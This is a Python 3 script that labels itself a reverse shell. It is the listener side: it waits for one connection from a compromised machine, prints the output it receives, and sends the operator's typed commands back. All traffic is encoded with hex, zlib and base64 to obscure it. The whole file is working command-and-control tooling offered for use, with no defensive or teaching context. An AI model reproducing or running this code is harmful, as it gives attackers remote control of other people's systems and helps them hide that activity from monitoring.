# coding=utf-8

import socket, argparse
import subprocess
import platform
import base64
import binascii
import zlib


def server(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(1)
    print('listen at ', sock.getsockname())
    try:
        c, a = sock.accept()
        while True:
            result = c.recv(8192)
            result = binascii.a2b_hex(result)
            result = zlib.decompress(result)
            data = base64.b64decode(result)
            if platform.system() == "Windows":
                data = data.decode('gbk')
            else:
                data = data.decode('utf-8')
            print(data)
            command = input('>>> ')
            if command == 'q':
                break
            command = command.encode('utf-8')
            command = base64.b64encode(command)
            command = zlib.compress(command)
            command = binascii.b2a_hex(command)
            c.send(command)
        print('Connection closed')
    except Exception as e:
        print(e)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Python3 Reverse Shell')
    parser.add_argument('host', help=' interface the server listens at;')
    parser.add_argument('port', type=int, default=1060, help='tcp port')
    args = parser.parse_args()
    if args.host:
        server(args.host, args.port)
